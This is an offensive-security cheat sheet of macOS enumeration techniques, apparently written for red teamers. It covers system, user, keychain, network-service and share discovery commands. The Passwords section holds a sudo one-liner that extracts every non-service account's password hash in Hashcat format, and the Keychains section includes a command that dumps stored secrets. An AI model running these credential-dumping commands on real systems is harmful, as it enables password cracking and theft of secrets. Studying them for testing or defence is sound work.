# Mac OSX TTPs

## Enumeration

### Gathering System Information Using IOPlatformExpertDevice

The ioreg command allows interaction with the I/O Kit registry, and the -c flag specifies the class of devices to list. The IOPlatformExpertDevice class provides information about the platform expert, which includes various system attributes. The -d flag specifies the depth of the search within the device tree.

```sh
ioreg -c IOPlatformExpertDevice -d 2
```

### Exploring Application Bundles

Applications on macOS are stored in the /Applications directory. Each application is bundled as a .app file, which is actually a directory with a specific layout. Key components of an application bundle include:

  1. Info.plist: This file contains application-specific configuration, entitlements, tasks, and metadata.

  2. MacOS: This directory contains the Mach-O executable.

  3. Resources: This directory includes icons, fonts, and images used by the application.

```sh
# List Applications
ls /Applications

cd /Applications/Lens.app
ls -R
```

### Basic System Enumeration

Versions:

```sh
❯ sw_vers
ProductName:		macOS
ProductVersion:		14.5
BuildVersion:		23F79
```

A basic script for gathering system information using `osascript`:

```scpt
-- System Information
set systemInfo to do shell script "system_profiler SPSoftwareDataType"
set hardwareInfo to do shell script "system_profiler SPHardwareDataType"

-- Network Information
set networkInfo to do shell script "ifconfig"

-- Disk Usage
set diskUsage to do shell script "df -h"

-- Output Results
set result to "System Information:\n" & systemInfo & "\n\n"
set result to result & "Hardware Information:\n" & hardwareInfo & "\n\n"
set result to result & "Network Information:\n" & networkInfo & "\n\n"
set result to result & "Disk Usage:\n" & diskUsage

-- Display Results
result
```

```sh
osascript enumerate_mac.scpt
```

Environment Variables:

```sh
❯ printenv
LANG=en_US.UTF-8
PWD=/Users/rosesecurity
```

Home Folders:

```sh
❯ ls -ma ~/
.!48082!pack-8ad6a5dc9b062d5e0e8d0bd9fa08146698e612e9.rev, .!48110!index, .., .CFUserTextEncoding, .DS_Store, .Trash, .aws,
.azure, .bash_history, .bashrc, .boto,
```

### Users

The three types of MacOS users are:

  - **Local Users** — Managed by the local OpenDirectory service, they aren’t connected in any way to the Active Directory

  - **Network Users** — Volatile Active Directory users who require a connection to the DC server to authenticate

  - **Mobile Users** — Active Directory users with a local backup for their credentials and files

```sh
# User and Group Enumeration

dscl . ls /Users
dscl . read /Users/[username]

dscl . ls /Groups
dscl . read /Groups/[group]

# Domain Enumeration
dsconfigad -show
```

### Passwords

The following one-liner which will dump credentials of all non-service accounts in Hashcat format `-m 7100` (`macOS PBKDF2-SHA512`):

```sh
sudo bash -c 'for i in $(find /var/db/dslocal/nodes/Default/users -type f -regex "[^_]*"); do plutil -extract name.0 raw $i | awk "{printf \$0\":\$ml\$\"}"; for j in {iterations,salt,entropy}; do l=$(k=$(plutil -extract ShadowHashData.0 raw $i) && base64 -d <<< $k | plutil -extract SALTED-SHA512-PBKDF2.$j raw -); if [[ $j == iterations ]]; then echo -n $l; else base64 -d <<< $l | xxd -p -c 0 | awk "{printf \"$\"\$0}"; fi; done; echo ""; done'
```

### Keychains

```sh
# List certificates
security dump-trust-settings [-s] [-d]

# List keychain databases
security list-keychains

# List smartcards
security list-smartcards

# List keychains entries
security dump-keychain | grep -A 5 "keychain" | grep -v "version"

# Dump all the keychain information, included secrets
security dump-keychain -d
```

> [!TIP]
> The last command will prompt the user for their password each entry, even if root. This is **extremely** noisy

### Network Services

```sh
rmMgmt=$(netstat -na | grep LISTEN | grep tcp46 | grep "*.3283" | wc -l);
scrShrng=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | grep "*.5900" | wc -l);
flShrng=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | egrep "\*.88|\*.445|\*.548" | wc -l);
rLgn=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | grep "*.22" | wc -l);
rAE=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | grep "*.3031" | wc -l);
bmM=$(netstat -na | grep LISTEN | egrep 'tcp4|tcp6' | grep "*.4488" | wc -l);
printf "\nThe following services are OFF if '0', or ON otherwise:\nScreen Sharing: %s\nFile Sharing: %s\nRemote Login: %s\nRemote Mgmt: %s\nRemote Apple Events: %s\nBack to My Mac: %s\n\n" "$scrShrng" "$flShrng" "$rLgn" "$rmMgmt" "$rAE" "$bmM";
```

### SMB Shares

```sh
# SMB share enumeration
smbutil view -G //servername.domain
sharing -l
smbutil statshares -a
```

### AFP Shares

```sh
# AFP share enumeration
dns-sd -B _afpovertcp._tcp
nmap -p 548 --script afp-showmount --script-args afp.username=yourusername,afp.password=yourpassword yourserveraddress
sudo sharing -l
```

### SSH Scanning

Browse for all SSH services that are currently advertised on the local network

```sh
dns-sd -B _ssh._tcp
```

### System Profiler

It is an application created to gather detailed information about the Mac on which it is running.

```sh
system_profiler SPSoftwareDataType SPHardwareDataType

Software:

    System Software Overview:

      System Version: macOS 14.5 (23F79)
      Kernel Version: Darwin 23.5.0
      Boot Volume: Macintosh HD
      Boot Mode: Normal
      Computer Name: Salsa-Dancer.RoseSecurity
      User Name: RoseSecurity (rose)
      Secure Virtual Memory: Enabled
      System Integrity Protection: Enabled
      Time since boot: 10 days, 14 hours, 54 minutes

Hardware:

    Hardware Overview:

      Model Name: MacBook Pro
      Model Identifier: Mac14,9
      Model Number: Z17G002HTLL/A
      Chip: Apple M2 Pro
      Total Number of Cores: 10 (6 performance and 4 efficiency)
      Memory: 32 GB
      System Firmware Version: 10151.121.1
      OS Loader Version: 10151.121.1
      Serial Number (system): XXXXXXXX
      Hardware UUID: 0012DE66-XXXXXXXX
      Provisioning UDID: 00006020-XXXX
      Activation Lock Status: Disabled
```
